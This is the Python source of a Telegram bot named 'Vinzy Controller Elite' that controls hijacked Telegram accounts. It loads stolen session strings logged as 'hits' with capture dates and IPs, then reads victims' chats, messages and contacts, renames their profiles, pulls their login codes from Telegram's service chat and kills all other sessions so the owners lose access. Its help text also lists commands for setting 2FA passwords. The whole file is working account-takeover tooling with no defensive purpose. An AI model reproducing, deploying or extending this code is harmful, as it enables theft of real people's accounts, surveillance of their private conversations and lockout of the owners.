import os
import asyncio
import telebot
import psycopg2
from telethon import TelegramClient, functions, types as tl_types, errors
from telethon.sessions import StringSession
from telebot import types

# --- 1. CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")

try:
    GROUP_ID = int(os.environ.get("GROUP_ID", "0"))
except:
    GROUP_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)

# --- 2. DATABASE LOGIC (NeonDB) ---
def get_db_conn():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS moonton_secure_vault (
            phone TEXT PRIMARY KEY,
            session_string TEXT NOT NULL,
            ip_address TEXT,
            capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    cur.close()
    conn.close()

def get_session(phone):
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("SELECT session_string FROM moonton_secure_vault WHERE phone = %s", (phone,))
    res = cur.fetchone()
    cur.close()
    conn.close()
    return res[0] if res else None

def get_all_phones():
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("SELECT phone, capture_date FROM moonton_secure_vault ORDER BY capture_date DESC")
    res = cur.fetchall()
    cur.close()
    conn.close()
    return res

# --- 3. CORE RUNNER ---
async def run_task(phone, task_func, *args):
    session_str = get_session(phone)
    if not session_str:
        return f"❌ Phone <code>{phone}</code> not found in database."
    
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    try:
        await asyncio.wait_for(client.connect(), timeout=15)
        if not await client.is_user_authorized():
            return f"❌ Session for <code>{phone}</code> is revoked."
        return await task_func(client, *args)
    except Exception as e:
        return f"⚠️ Error: {str(e)}"
    finally:
        await client.disconnect()

# --- 4. TASK LOGIC ---

async def logic_set_name(client, first, last):
    await client(functions.account.UpdateProfileRequest(first_name=first, last_name=last))
    return f"✅ Name changed to <b>{first} {last}</b>"

async def logic_get_contacts(client):
    res = await client(functions.contacts.GetContactsRequest(hash=0))
    output = "👤 <b>Top Contacts:</b>\n"
    for u in res.users[:30]:
        name = f"{u.first_name or ''} {u.last_name or ''}".strip()
        output += f"• {name} (@{u.username or 'NoUser'})\n"
    return output

# --- 5. COMMAND HANDLERS ---

@bot.message_handler(commands=['help'])
def cmd_help(m):
    if m.chat.id != GROUP_ID: return
    help_text = (
        "👑 <b>Vinzy Controller Elite</b>\n"
        "━━━━━━━━━━━━━━━\n"
        "📡 <b>Database:</b>\n"
        "• <code>.list</code> - Show all hits in NeonDB\n\n"
        "🔐 <b>Security:</b>\n"
        "• <code>.check2fa [phone]</code>\n"
        "• <code>.set2fa [phone] [pw]</code>\n"
        "• <code>.kickall [phone]</code>\n\n"
        "🕵️ <b>Stealth:</b>\n"
        "• <code>.getcode [phone]</code> - Login code\n"
        "• <code>.chats [phone] [limit]</code>\n"
        "• <code>.msgs [phone] [chat_id] [limit]</code>\n"
        "• <code>.contacts [phone]</code>\n\n"
        "📝 <b>Profile:</b>\n"
        "• <code>.bio [phone] [text]</code>\n"
        "• <code>.name [phone] [first] [last]</code>\n"
        "━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, help_text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.list')
def cmd_list(m):
    if m.chat.id != GROUP_ID: return
    data = get_all_phones()
    if not data: return bot.reply_to(m, "📭 Database is empty.")
    msg = "📋 <b>Hits in NeonDB:</b>\n"
    for phone, date in data:
        msg += f"• <code>{phone}</code> | {date.strftime('%d/%m %H:%M')}\n"
    bot.send_message(m.chat.id, msg, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.name'))
def cmd_name(m):
    if m.chat.id != GROUP_ID: return
    p = m.text.split(" ")
    if len(p) < 4: return bot.reply_to(m, "❌ Usage: <code>.name [phone] [first] [last]</code>")
    res = asyncio.run(run_task(p[1], logic_set_name, p[2], p[3]))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.contacts'))
def cmd_contacts(m):
    if m.chat.id != GROUP_ID: return
    p = m.text.split(" ")
    if len(p) < 2: return bot.reply_to(m, "❌ Usage: <code>.contacts [phone]</code>")
    res = asyncio.run(run_task(p[1], logic_get_contacts))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.chats'))
def cmd_chats(m):
    if m.chat.id != GROUP_ID: return
    p = m.text.split(" ")
    if len(p) < 2: return bot.reply_to(m, "❌ Usage: <code>.chats [phone] [limit]</code>")
    limit = int(p[2]) if len(p) > 2 else 15
    
    async def logic(client, l):
        out = "💬 <b>Recent Chats:</b>\n"
        async for d in client.iter_dialogs(limit=l):
            tag = "👤" if d.is_user else "👥"
            out += f"{tag} <code>{d.id}</code> | {d.name}\n"
        return out
    
    res = asyncio.run(run_task(p[1], logic, limit))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.msgs'))
def cmd_msgs(m):
    if m.chat.id != GROUP_ID: return
    p = m.text.split(" ")
    if len(p) < 3: return bot.reply_to(m, "❌ Usage: <code>.msgs [phone] [chat_id] [limit]</code>")
    
    chat_id = int(p[2]) if p[2].strip('-').isdigit() else p[2]
    limit = int(p[3]) if len(p) > 3 else 10
    
    async def logic(client, cid, l):
        out = f"📩 <b>Messages in {cid}:</b>\n"
        async for msg in client.iter_messages(cid, limit=l):
            sender = "User" if msg.out else "Target"
            txt = msg.text[:40] + "..." if msg.text and len(msg.text) > 40 else (msg.text or "[Media]")
            out += f"• <b>{sender}:</b> {txt}\n"
        return out
    
    res = asyncio.run(run_task(p[1], logic, chat_id, limit))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.kickall'))
def cmd_kick(m):
    if m.chat.id != GROUP_ID: return
    p = m.text.split(" ")
    async def logic(client):
        await client(functions.auth.ResetAuthorizationsRequest())
        return "⚡ All other sessions terminated."
    res = asyncio.run(run_task(p[1], logic))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.getcode'))
def cmd_code(m):
    if m.chat.id != GROUP_ID: return
    p = m.text.split(" ")
    async def logic(client):
        async for msg in client.iter_messages(777000, limit=1):
            return f"📩 <b>Code:</b>\n<code>{msg.text}</code>"
        return "📭 No code found."
    res = asyncio.run(run_task(p[1], logic))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

if __name__ == "__main__":
    init_db()
    print("Vinzy Elite Controller Online...")
    bot.infinity_polling()
